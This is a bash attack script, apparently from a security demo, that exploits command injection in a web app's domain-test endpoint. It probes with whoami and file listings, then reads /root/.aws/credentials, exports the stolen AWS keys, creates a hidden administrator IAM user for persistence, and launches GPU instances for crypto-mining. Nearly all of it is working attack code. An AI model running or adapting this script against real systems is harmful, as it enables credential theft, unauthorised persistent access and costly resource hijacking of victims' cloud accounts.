#!/bin/bash

if [[ $# != 1 ]]; then
  echo "Usage: run-attack.sh app-url" >&2
  exit 1
fi

function request() {
  echo "Requesting $1"
  curl -s $url/test-domain -H "Content-Type: application/json" -X POST -d "{\"domainName\":\"$1\"}"
  echo
}
function randomSleep() {
  sleep $((RANDOM % 4))
}

url=$1
echo "Attacking $url"

# echo "Performing recon"
# request "google.com"
# randomSleep

# request "aaaaa"
# randomSleep

# request '$(whoami)'
# randomSleep

# request '\`whoami\`'
# randomSleep

# request '127.0.0.1'
# randomSleep

# request '127.0.0.1 && whoami'
# randomSleep

# request '127.0.0.1 && cat /etc/os-release'
# randomSleep

# request '127.0.0.1 && ls -l /root'
# randomSleep

# request '127.0.0.1 && ls -l /root/.aws'
# randomSleep

creds=$(request '127.0.0.1 && cat /root/.aws/credentials')
export AWS_ACCESS_KEY_ID=$(echo "$creds" | grep aws_access_key_id | cut -d= -f2)
export AWS_SECRET_ACCESS_KEY=$(echo "$creds" | grep aws_secret | cut -d= -f2)
aws sts get-caller-identity
randomSleep

# Create an IAM user for persistence
aws iam create-user --user-name support
aws iam attach-user-policy --user-name support --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name support

# Spin up a bunch of instances
randomSleep
echo "Attempting to spin up GPU instances"
AMI_ID=$(aws ssm get-parameters-by-path --path /aws/service/ami-amazon-linux-latest --query "Parameters[].Name")
aws ec2 run-instances \
    --image-id $AMI_ID \
    --instance-type g4ad.xlarge # https://medium.com/coinmonks/new-aws-instance-that-makes-eth-mining-profitable-1dd87183cce7
    --count 5